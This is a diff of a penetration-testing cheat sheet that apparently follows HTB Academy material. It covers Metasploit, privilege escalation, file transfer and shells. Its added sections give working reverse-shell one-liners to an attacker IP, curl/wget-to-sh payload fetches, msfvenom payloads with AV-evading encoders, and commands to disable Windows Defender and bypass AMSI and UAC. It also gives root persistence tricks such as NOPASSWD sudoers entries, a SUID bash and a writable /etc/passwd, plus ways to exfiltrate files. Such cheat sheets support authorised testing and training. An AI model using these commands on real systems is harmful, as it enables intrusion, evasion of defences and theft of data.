-$ export TERM=xterm-256color
-$ stty rows [] columns []
-```
-
-
-
-## Metasploit
-
-Multiple sessions can be handled:
-
-in `msfconsole`:
-
-```bash
-sessions			# visualize active session
-sessions -i [no.]	# switch session
-```
-
-Background the current session with `[CTRL] + [Z]`
-
-The `jobs` command lets you handle active jobs:
-
-- An exploit can be run as a job by typing `exploit -j`
-- To list all running jobs  `jobs -l` 
-
-- To kill a specific job  `kill [index no.]` 
-- `jobs -K`  to kill all running jobs.
-
-
-
-### Modules
-
-In `msfconsole`:
-
-```bash
-search [exploit]
-
-use [number exploit]
-info
-options
-
-show target				# show OS/language version/service pack
-set target [alue]
-
-set [option] [value]	# use setg to set permanently
-
-run
-```
-
-In the search we can specify 
-
-- the  year (`cve:<year>`), 
-- the platform Windows (`platform:<os>`), 
-- the type of module we want to find (`type:<auxiliary/exploit/post>`), 
-- the reliability rank (`rank:<rank>`), 
-- the search name (`<pattern>`). 
-
-| **Type**    | **Description**                                              |
-| ----------- | ------------------------------------------------------------ |
-| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
-| `Encoders`  | Ensure that payloads are intact to their destination.        |
-| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
-| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts. |
-| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
-| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist. |
-| `Post`      | Wide array of modules to gather information, pivot deeper, etc. |
-
-#### Import module
-
-To import an exploit from `searchsploit`:
-
-```bash
-searchsploit [exploit]	#get exploit path
-cd /usr/share/metasploit-framework/modules
-mkdir [exploit path]	# create the full exploit path inside msf
-cd [exploit path]
-searchsploit -m [exploit_number]	# copies the exploit
-msfconsole
-	>use [exploit path]
-```
-
-### Payloads
-
-Module that aids the exploit module in (typically) returning a shell to the attacker. Whether or not a payload is staged is represented by `/` in the payload name.
-
-- Singles: contains the exploit and the entire shellcode 
-- Stagers: staged payload that  typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. 
-- Stages: payload components that are downloaded by stager's modules.
-
-in `msfconsole`
-
-```bash
-grep [search value 1] grep [search value 2] show payloads
-set payload [no.]
-
-show options
-show encoders 	# See below
-run
-```
-
-#### Encoders
-
-Encoders change the payload to:
-
--  run on different operating systems and architectures. 
--  remove hexadecimal opcodes known as `bad characters`.
--  help with the AV detection
-
-Shikata Ga Nai (`SGN`) is one of the most utilized Encoding.
-
-`msfvenom` takes care of payload generation and Encoding, by adding the flag `-e`, e.g. if the architecture is `x86`:
-
-```bash
--e x86/shikata_ga_nai
-```
-
-Also, the flag `-i [number of iteration]` is useful to run the encoding multiple times, in order to evade AV.
-
-To test if your malware is undetectable (FUD) enough: https://antiscan.me/
-
-### Plugins
-
-Found in `/usr/share/metasploit-framework/plugins`
-
-In `msfconsole`:  -> `load [plugin]`
-
-### Meterpreter migration (Windows)
-
-in `meterpreter`, when the shell doesn't appear:
-
-```bash
-ps		# List processes
-steal_token [PID of process network or local service]
-```
-
-
-
-## Verify code execution
+Before trying for a shell, it is good practice to **verify code execution**:
 
 1. In the code execute the command:
 
@@ -2791,323 +2384,517 @@ steal_token [PID of process network or local service]
    sudo tcpdump -i tun0 icmp
    ```
 
-# Privilege Escalation
+## Web
 
-One excellent resource is [HackTricks](https://book.hacktricks.xyz), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. 
+**Locations:**
 
-**Scripts**
+- `ls -la /usr/share/webshells`
+- `/usr/share/laudanum`
+- [Repository](https://github.com/nicholasaleks/webshells)
 
-- Linux
-  - [Linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (enum)
-  - [LinEnum](https://github.com/rebootuser/LinEnum.git) (enum)
-  - [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (enum)
-  - [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
-- Windows
-  -  [Seatbelt](https://github.com/GhostPack/Seatbelt) (enum)
-  -  [JAWS](https://github.com/411Hall/JAWS) (enum)
-  -  [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+**Default webroots:**
+
+| Web Server | Default Webroot        |
+| ---------- | ---------------------- |
+| `Apache`   | /var/www/html/         |
+| `Nginx`    | /usr/local/nginx/html/ |
+| `IIS`      | c:\inetpub\wwwroot\    |
+| `XAMPP`    | C:\xampp\htdocs\       |
 
 ## Linux
 
-### Users
+### File Transfer
 
-- Users `cat /etc/passwd | grep sh` and `ls  /home`
-- User Group:
+#### Writable Directories
 
-  -  `id` and what can that group do
-  -  [interesting_groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe)
+- `/var/tmp`
+- `/tmp`
+- `/dev/shm`
 
-### Privileges
+#### HTTP
 
-Search on [gtfobins](https://gtfobins.github.io) bin files with relative privileges
+**Download**
 
-#### sudo
+- [GTFOBins](https://gtfobins.github.io/#+file download)
+- `httpserv()`
+- `curl http://[IP]:8888/[SRC] -o [DEST]` you can pipe command
+- `wget http://[IP]:8888/[SRC] -O [DEST]` with `-qO` you can pipe command
 
-```bash
-sudo -l		 # List sudo privileges
+**Upload**
 
-sudo su 	 # Switch to the root user 
-su [USER] 	 # Switch to a local user
-sudo -u [USER] [COMMAND] 	# Execute an application as an user
-```
+1. Create self-signed certificate
 
-- **Symlinks attacks**
+   ```bash
+   openssl req -x509 -out /tmp/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+   ```
 
-  A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`
+2. Start Web Server in a new folder
 
-  The `*` character gets expanded to all the matching files.
+   ```bash
+   mkdir /tmp/https && cd /tmp/https
+   sudo python3 -m uploadserver 443 --server-certificate /tmp/server.pem
+   ```
 
-  **Examples**
+3. Upload (multiple files can be specified)
 
-  - `chown` and `chmod`
+   ```bash
+   curl -X POST https://[IP]/upload -F 'files=@[FILE]' --insecure
+   ```
 
-    - `chown [USER] [FILE]`
+   `--insecure` since we used a self-signed certificate that we trust.
 
-      Sets the owner of the specified `[FILE]` to the `[USER]`.
+#### Bash /dev/tcp
 
-    - `chown [USER] [FILE] --reference=[REF FILE]`
+As long as Bash version 2.04 or greater is installed (compiled with  --enable-net-redirections), the built-in /dev/TCP device file can be  used for simple file downloads.
 
-      Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.
+1. Connect to the target Webserver
 
-    ```bash
-    # Create a file reference owned by us
-    touch reference
-    # Create a file called as the flag of chown
-    touch -- --reference=reference
-    ```
+   ```bash
+   exec 3<>/dev/tcp/[IP]/[PORT]
+   ```
 
-    If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.
+2. HTTP GET Request
 
-  **Avoid checks:**
+   ```bash
+   echo -e "GET [FILE] HTTP/1.1\n\n">&3
+   ```
 
-  - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:
+3. Print the response
 
-    ```bash
-    ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
-    ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
-    ```
+   ```bash
+   cat <&3
+   ```
 
-#### suid
+#### Upload from server
 
-- `find / -perm -u=s -type f 2>/dev/null`: checks for *SUID binaries* 
+- `python3 -m http.server 8000`
+- `python2 -m SimpleHTTPServer 8000`
+- `php -S 0.0.0.0:8000`
+- `ruby -run -ehttpd . -p8000`
 
-### Credential Hunting
+`curl [URL] -o [FILE_NAME]` to download from the target
 
-- Some files worth checking:
+#### Netcat
 
-  - `configuration` files
-  - `log` files, 
-  - `bash_history` 
+**Download on target**
 
-- Search credentials in folder and subfolders:
+1. Start netcat on the target
 
-  ```bash
-  grep -rniH "[STRING]" [PATH] [-e REGEX]
-  ```
+   ```bash
+   nc -lvnp 8000 --recv-only > [FILE]
+   ```
 
-  - `-r` recursive
-  - `-n` output the line number
-  - `-i` case insensitive
-  - `-H`  output the content
+   If the compromised machine is using Ncat, specify `--recv-only` to close the connection once the file transfer is finished.
 
-  Credentials are variable assignments, which are made of:
+2. On our machine, we upload the file on netcat
 
-  - name: password, credential, pass, psw, token, key, secret
-  - separator: =, : (with or without space)
-  - quotes
+   ```bash
+   nc --send-only [IP] [PORT] < [FILE]
+   ```
 
-  Some examples:
+If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html). Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
 
-  ```bash
-  grep -rniH "password = '" .		# string assignment (try also with \")
-  grep -rniH "password':" . 		# dictionary assignment
-  grep -rniH "password'," .		# tuple assignment
-  ```
+1. Open listener on you machine
 
-- Shadow Hashes
+   ```bash
+    sudo ncat -l -p 443 --send-only < SharpKatz.exe
+   ```
 
-  A shadow hash is the encrypted password of a local host. To crack it, we need the file /etc/passwd, which contains only the users with a local account.
+2. On the target:
 
-### Files
+   ```bash
+   cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+   ```
 
-- Readable / Owned web files (for web application)
+#### B64
 
-  - `find /var/www -type f -group [group] 2>/dev/null`  
-
-  - `find /var/www -type f -user [user] 2>/dev/null`
-
-  - `find /var/www -type f -readable 2>/dev/null`
-
-  - `/proc` and `sis` `run` not interesting
-
-- Scheduled Tasks:
-
-  **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
-
-  - `/etc/crontab`
-  - `/etc/cron.d`
-  - `/var/spool/cron/crontabs/root`
-
-- SSH keys:  
-
-  - Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
-
-
-  ```bash
-  $ chmod 600 id_rsa	# More restrictive permission
-  $ ssh root@10.10.10.10 -i id_rsa
-  $ nano id_rsa	# open and copy on your machine
-  ```
-
-  - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`
-
-
-  ```bash
-  ssh-keygen -f key	#Generate a key in the output file key
-  ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
-  ssh user@10.10.10.10 -i key	# Login
-  ```
-
-### Local Network Services
-
-- `netstat -puntal` or `ss -puntal` (access/ tunnel)
-
-
-Look at `LISTEN` ports
-
-- Tunneling
-
+1. Encode the file
 
 ```bash
-ssh -L [LOCAL PORT]:127.0.0.1:[LOCAL PORT] [USER]@[IP] -fN
+cat [FILE] |base64 -w 0;echo
 ```
+
+2. Copy the string
+
+3. Go on the remote host, decode
 
 ```bash
-sudo nmap -p[PORT] 127.0.0.1
+echo -n [STRING] | base64 -d > [FILE_NAME]
 ```
 
-#### Chrome
+**Validate Transfer**
 
+`file`: validates the format of a file
 
+`md5sum` validates the hash of the filestomi
 
-### Local Processes
+#### SSH
 
-- `ps -aux | grep [USER, ROOT...]`
-- `ps -aux` look for local databases
+1. Enable SSH server
 
-### OS 
+   ```bash
+   sudo systemctl enable ssh
+   ```
 
-- Kernel Exploits
+2. Start the server
 
-- Vulnerable Software: `dpkg -l` 
+   ```
+   sudo systemctl start ssh
+   ```
+
+3. Check for listening port
+
+   ```bash
+   netstat -lnpt
+   ```
+
+4. Download
+
+   ```bash
+   scp user@remotehost:[FILE_PATH]
+   ```
+
+To upload:
+
+```bash
+scp [FILE] user@targethost:[OUTPUT LOCATION
+```
+
+### Shells & Payloads
+
+#### TTY upgrade
+
+- General method (if python is not installed)
+
+```bash
+script -qc /bin/bash /dev/null
+```
+
+- Python method (try different python versions)
+
+```bash
+# In reverse shell
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
+
+# In Kali
+$ stty raw -echo
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows [] columns []
+```
+
+#### Bash / Netcat payloads
+
+- `sh -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1`
+- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc [KALI_IP] [PORT] >/tmp/f` 
+- `busybox nc [KALI_IP] [PORT] -e sh`
+
+#### CURL / WGET
+
+- `httpserv()`
+- `wget -q -O - http://[KALI_IP]/[PAYLOAD.SH] | sh`
+- `curl -s http://[KALI_IP]/[PAYLOAD.SH] | sh`
+
+#### SSH Hijacking (offline)
+
+- `ssh-keygen -t ed25519 -f [KEY_FILE]`
+- Paste Your Public Key  -> `/home/[VICTIM_USER]/.ssh/authorized_keys`
+- Set Permission             -> `chmod 600 [KEY_FILE]`
+- Login                              -> `ssh -i [KEY_FILE] [USER]@[IP]`
+
+#### MSFVenom
+
+- Executable Upload
+  - `metash()`
+    - ELF              → `chmod +x [FILE]`
+    - ELF-SO        → SO Hijacking
+  - PHP             → `-p php/meterpreter/reverse_tcp -f raw`
+  - WAR / JSP   → `-p java/shell_reverse_tcp -f war`
+- Buffer Overflow (BOF) Shellcode
+  - `msfvenom -a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [ENCODER] -i 3 --smallest` 
+  - Encoders         → `x86/shikata_ga_nai` / `x86/unicode_m`
+  - Extra Options → `BufferRegister=EAX` / `Exitfunc=thread`
+
+#### Metasploit
+
+- Staged (more stable):   
+
+  `set payload linux/[x86/X64]/shell/[BIND/REVERSE]_tcp`
+
+- Stageless (stelthier): 
+
+  `set payload linux/[x86/X64]/shell_[BIND/REVERSE]_tcp`
+
+#### Offline bash Payloads 
+
+~when you have RCE on a root process
+
+- Make bash a SUID
+
+  `chmod u+s /bin/bash` → `/bin/bash -p`
+
+- Make a general binary from [GTFOBin](https://gtfobins.github.io/) a SUID (if bash is not available):
+
+  `chmod u+s [GTFO_BINARY]` -> Exploit following GTFObin
+
+- Make the shadow hashes readable:
+
+  `chmod u+r /etc/shadow`  → Hash Cracking
+
+- Make `/etc/passwd` writable:
+
+  `chmod u+w /etc/passwd`  → Remove `x` from root → `su - root`
+
+- Give to a User that you can control `sudo su` privileges
+
+  `echo "[USER] ALL=(ALL) NOPASSWD: ALL" | tee /etc/sudoers.d/[USER]` 
+
+- Create User with sudo priviledges  -> you can execute sudo without password
+
+  ```bash
+  usermod [USER] --password $(echo [PASS] | openssl passwd -1 -stdin)
+  usermod -aG sudo [USER]
+  ```
 
 ## Windows
 
-### Users
+### Evasion
 
-- Users & Groups
-  - `net user`
-  - `net localgroup`
-  - `net user [USER]`
-- Memberships & Privileges
+#### Antivirus Evasion
 
-  -  `whoami /all`
-  -  Check non-default groups -> [Exploits](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
-  -  Check non-default privileges -> [Exploits](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
-     - `SeDebug`
-     - `SeBackup`
-     - `SeImpersonate` / `SeAssignPrimaryToken`
-     - `SeRestore`
-     - `SeManage`
-  -  [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user
+You have an antivirus when you cannot execute malwares [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)
 
-### Credential Hunting:
+- Enumeration
+  - `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
+  - `Get-MpComputerStatus`
+- Folder Exclusion Bypass
+  - Check Folders -> `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
+  - Place Malware in Allowed Folder
+- Disable AV (Code Execution as Admin)
+  - `powershell Set-MpPreference -DisableIOAVProtection $true`
+  - `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
+- Malware Obfuscation tools:
+  - `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe -x [WIN_BINARY] > out.exe` -> Choose "whoami" / "ping" / "plink"
+  - [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)
+  - Prometheus Shell
+    - [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
+    - 32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
 
-- Check locations:
+#### Powershell evasion
 
-  - Desktop: `cd C:\Users\[USER]\Desktop`
+- Execution Policy
+  - `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]`
+  - `Set-ExecutionPolicy Bypass -Scope Process` -> From a PS Session
+  - 32/64-Bit Execution
+    - Try Both Binaries
+    - `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
+    - `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
+- AMSI
+  - Paste the payload in a PS session to bypass AMSI
+  - [Payloads Here](https://amsi.fail)
+- Constrained Language
+  - Check if enabled -> `$ExecutionContext.SessionState.LanguageMode`
+  - [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
+- AppLocker: excludes some folders that you can execute powershell from
+  - `Get-AppLockerPolicy -Effective | select -exp RuleCollections` 
+  - [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Run Scripts from Allowed Folders
 
-  - configuration fikes
+#### UAC
 
-  - log files
+When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user
 
-  - History `PSReadLine`
+- Enumeration
+  - Member of "Administrators" + Restricted Privileges / File Access
+  - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` -> Check if greater than "0"
+  - `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` -> Check if greater than "0"
+- Bypasess
+  - `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626) + Google Search
+  - Send Reverse Shell                            → Through a SYSTEM RCE / Similar Exploit
+  - GUI Access                        → CMD “Run as Administrator” → Input Credentials
+  - EventViewer Method
+    - [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
+    - Exploit            → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
+  - PSExec (Local / Remote)
+    - `PsExec.exe -h -s -i cmd` -> No Credentials
+    - `psexec.py [AUTH_STRING]` -> Requires Credentials
 
-- Saved passwords `cmdkey /list`
+### File Transfer
 
-  ````cmd
-  runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
-  ````
+Check for a writable directory &rarr; Open a server &rarr; Use a download/upload method
 
-- `tree /a /f c:\users`
+#### Writable Directories
 
-### Files
+To check permissions over an object -> `icacls [DIR/FILE]` Check for RX,WD or F
 
-- Readable / Owned web files (for web application)
+- `c:\windows\temp\`
+- `c:\windows\tracing\`
+- `C:\windows\tasks\`
+- `c\windows\system32\spool\drivers\color\`
 
-  - SSH keys:  
+#### SMB
 
-    - Read: copy it from `file:///c:/users/[USERNAME]/.ssh/id_rsa`
+1. Create SMB server
 
-      ```bash
-      $ chmod 600 id_rsa	# More restrictive permission
-      $ ssh root@10.10.10.10 -i id_rsa
-      $ nano id_rsa	# open and copy on your machine
+   ```bash
+   smb_server() 
+   ```
+
+   New versions of Windows block unauthenticated guest access, in this case you need to set unsername and password in SMB
+
+   ```bash
+   smbserver.py -ip $tunip -username USER -password PASS share . 
+   ```
+
+2. Download to the target
+
+   ```cmd
+   copy \\[YOUR IP]\share\[FILE]
+   ```
+
+   If you need credentials:
+
+   ```cmd
+   net use n: \\[YOUR IP]\share /user:USER PASS
+   copy n:\[FILE]
+   ```
+
+​	`-smb2support` is a flag if SMB1 is not allowed
+
+#### WebDAV 
+
+Commonly enterprises don't allow the SMB protocol (TCP/445) out of  their internal network because this can open them up to potential  attacks. An alternative is to run SMB over HTTP with `WebDav`.
+
+1. Open WebDav
+
+   ```bash
+   sudo wsgidav --host=0.0.0.0 --port=[PORT] --root=/tmp --auth=anonymous 
+   ```
+
+2. Connect to WebDav
+
+   ```powershell
+   > dir \\[IP]\DavWWWRoot
+   ```
+
+3. Upload with SMB
+
+   ```powershell
+   > copy [FILE] \\[IP]\DavWWWRoot\
+   ```
+
+#### HTTP
+
+- Open http server `httpserv()`
+
+- Download the file from the server:
+
+  - certutil (works on both 32 and 64)
+
+    ```cmd
+    certutil.exe -urlcache -split -f [HTTP_SERVER]/[INPUT] [OUTPUT]
+    ```
+
+  - bitsadmin
+
+    ```cmd
+    bitsadmin /transfer wcb /priority foreground [HTTP_SERVER]/[INPUT] [OUTPUT]
+    ```
+
+  - Other Win native binaries: [LOLBAS](https://lolbas-project.github.io)
+
+  - Powershell
+
+    - ```cmd
+      powershell -c (New-Object System.Net.WebClient).DownloadFile('http://[KALI_IP]:8888/[SRC]', '[DEST]')
       ```
 
-    - Write: place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`
-
-      ```bash
-      ssh-keygen -f key	#Generate a key in the output file key
-      ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
-      ssh root@10.10.10.10 -i key	# Login
+    - ```bash
+      powershell wget http://[KALI_IP]:8888/[SRC] -o [DEST]
       ```
 
-    
+- Upload the file on the server
 
-### Local Network Services
+  - To Kali → `. .\PSUpload.ps1` + `Invoke-FileUpload -Uri http://[KALI_IP]:8888/[DEST] -File [SRC]`
 
-- `systeminfo`
+#### Python server
 
-### Local Processes
+1. Open a server
 
-### OS
+   ```bash
+   python3 -m uploadserver
+   ```
 
+2. Upload via Invoke-RestMethod
 
-- Kernel Exploits
+   ```cmd
+   > IEX(New-Object Net.WebClient).DownloadString('[LINK]')
+   > Invoke-FileUpload -Uri http://[IP]/upload -File [FILE PATH]
+   ```
 
-  - In meterpreter: local exploit suggester module
-- Vulnerable Software:  `C:\Program Files` 
+#### Netcat + Base64
 
-## Jail Brekout
+1. Open netcat listener
 
-### Docker
+   ```bash
+   listen 8000	
+   ```
 
-To check if you are in a docker container type `hostname`. A docker has a random string as hostname.
+2. Send the file by using `Invoke-WebRequest` or `Invoke-RestMethod` in base 64
 
-- If you are root you can read the shadow password file `/etc/shadow`
+   ```powershell
+   > $b64 = [System.convert]::ToBase64String((Get-Content -Path '[PATH]' -Encoding Byte))
+   > Invoke-WebRequest -Uri http://[IP]/ -Method POST -Body $b64
+   ```
 
+3. Decode
 
+   ```bash
+   echo <base64> | base64 -d -w 0 > hosts
+   ```
 
-# Transferring files
+#### FTP
 
-## Windows
+- `ftpserv()`
 
-### Download
+- Download
 
-#### Native Binaries
+  ```cmd
+  powershell -c (New-Object Net.WebClient).DownloadFile('ftp://[KALI_IP]:2121/[SRC]', '[DEST]')
+  ```
 
-[LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
+- Upload:
 
-**Bitsadmin**
+  ```cmd
+  (New-Object Net.WebClient).UploadFile('ftp://[KALI_IP]:2121/[DEST]', '[SRC]')`
+  ```
 
-The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It  "intelligently" checks host and network utilization into account to  minimize the impact on a user's foreground work.
+- If the shell is not interactive, you can create an FTP command file to download the file. Use `PUT` instead of `GET` to upload.              
 
-```cmd
-bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
-```
+  ```cmd-session
+  C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+  C:\htb> echo USER anonymous >> ftpcommand.txt
+  C:\htb> echo binary >> ftpcommand.txt
+  C:\htb> echo GET file.txt >> ftpcommand.txt
+  C:\htb> echo bye >> ftpcommand.txt
+  C:\htb> ftp -v -n -s:ftpcommand.txt
+  ftp> open 192.168.49.128
+  
+  ftp> USER anonymous
+  ftp> GET file.txt
+  ftp> bye
+  
+  C:\htb>more file.txt
+  This is a test file
+  ```
 
-**Bitstransfer (powershell)**
+#### Base 64
 
-```powershell-session
-Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
-```
+`cmd` has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. 
 
-**Certutil**
-
-```cmd
-certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
-```
-
-**GfxDownloadWrapper.exe**
-
-```powershell-session
-GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
-```
-
-#### Base64
-
-Note that Windows Command Line utility (cmd.exe) has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send  extremely large strings. 
+**Download:**
 
 1. check the encoding to compare later:
 
@@ -3133,7 +2920,45 @@ Note that Windows Command Line utility (cmd.exe) has a maximum string length of 
    Get-FileHash [LOCATION] -Algorithm md5
    ```
 
-#### Powershell web Downloads
+**Upload**
+
+1. Encode with Powershell
+
+   ```powershell
+   [Convert]::ToBase64String((Get-Content -path "[PATH]" -Encoding byte))
+   ```
+
+2. Check MD5 hash to check later if the procedure was successsfull
+
+   ```powershell
+   Get-FileHash "[PATH]" -Algorithm MD5 | select Hash	
+   ```
+
+3. Copy paste point 1. and decode in your machine
+
+   ```bash
+   echo [STRING] | base64 -d > hosts
+   ```
+
+4. Check if the procedure was correct by comparing with 2.:
+
+   ```bash
+   md5sum hosts
+   ```
+
+#### RDP
+
+If copying with `xfreerdp` doesn't work:
+
+- Mount a Linux folder
+
+  ```bash
+  xfreerdp /v:[IP] /d:[DOMAIN] /u:[USER] /p:[PASSWD] /drive:linux,/home/plaintext/htb/academy/filetransfer
+  ```
+
+-  To access the directory, we can connect to `\\tsclient\`, allowing to transfer files
+
+#### Powershell
 
 Defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains.
 
@@ -3183,433 +3008,47 @@ Defenders can use Web filtering solutions to prevent access to specific website 
 
 -  [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
 
-  ```cmd
-  Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-  ```
-  
-  - Evading detection:
-  
-    If some User Agents were blacklisted, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default  user agent to one emulating Internet Explorer, Firefox...
-  
-    ```powershell
-    $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-    ```
-  
-    And add the flag `-UserAgent $UserAgent` to the download command
-
-#### SMB Downloads
-
-1. Create SMB server
-
-   ```bash
-   smb_server()
-   ```
-
-   New versions of Windows block unauthenticated guest access, in this case you need to set unsername and password in SMB
-
-   ```bash
-   smbserver.py -ip $tunip -username USER -password PASS share . 
-   ```
-
-2. Copy a file from the SMB server
-
    ```cmd
-   copy \\[YOUR IP]\share\[FILE]
+   Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    ```
 
-   If you need credentials:
+   - Evading detection:
 
-   ```cmd
-   net use n: \\[YOUR IP]\share /user:USER PASS
-   copy n:\[FILE]
-   ```
+     If some User Agents were blacklisted, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default  user agent to one emulating Internet Explorer, Firefox...
 
-#### FTP Downloads
+     ```powershell
+     $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+     ```
 
-1. Setting up the server
+     And add the flag `-UserAgent $UserAgent` to the download command
 
-   ```bash
-   sudo python3 -m pyftpdlib --port 21
-   ```
+#### Programming languages
 
-    Anonymous authentication is enabled by default
-
-2. Use Powershell `Net.WebClient` or FTP on Windows to download the file
-
-3. If the shell is not interactive, you can create an FTP command file to download the file:                 
-
-   ```cmd-session
-   C:\htb> echo open 192.168.49.128 > ftpcommand.txt
-   C:\htb> echo USER anonymous >> ftpcommand.txt
-   C:\htb> echo binary >> ftpcommand.txt
-   C:\htb> echo GET file.txt >> ftpcommand.txt
-   C:\htb> echo bye >> ftpcommand.txt
-   C:\htb> ftp -v -n -s:ftpcommand.txt
-   ftp> open 192.168.49.128
-   Log in with USER and PASS first.
-   ftp> USER anonymous
-   
-   ftp> GET file.txt
-   ftp> bye
-   
-   C:\htb>more file.txt
-   This is a test file
-   ```
-
-#### RDP
-
-If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.
-
-**If copying with xfreerdp doesn't work**
-
-1. Mount a Linux folder
-
-   ```bash
-   xfreerdp /v:[IP] /d:[DOMAIN] /u:[USER] /p:[PASSWD] /drive:linux,/home/plaintext/htb/academy/filetransfer
-   ```
-
-2. To access the directory, we can connect to `\\tsclient\`, allowing to transfer files
-
-#### PowerShell Remoting (WinRM)
-
-To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.
-
